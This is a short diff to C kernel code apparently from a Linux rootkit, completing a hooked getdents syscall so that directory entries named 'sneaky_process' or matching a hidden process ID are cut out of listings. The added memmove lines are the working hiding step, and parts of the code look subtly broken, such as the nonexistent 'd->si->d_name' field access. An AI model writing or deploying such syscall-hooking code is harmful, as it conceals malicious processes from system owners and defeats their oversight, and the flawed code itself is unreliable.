@@ -65,15 +65,14 @@ asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
     }
 
     for (int bpos = 0; bpos < nread;) {
-        d = (struct linux_dirent *) (d->si + bpos);
+        d = (struct linux_dirent *) (regs->si + bpos);
         if (strcmp(d->si->d_name, "sneaky_process") == 0 || strcmp(d->si->d_name, sneaky_pid) == 0) {
-
+            memmove(regs->si + bpos, regs->si + bpos + d->d_reclen, nread - d->d_reclen - bpos);
+            nread -= d->d_reclen;
+            continue;
         }
-
         bpos += d->d_reclen;
     }
-
-
     return nread;
 }
 
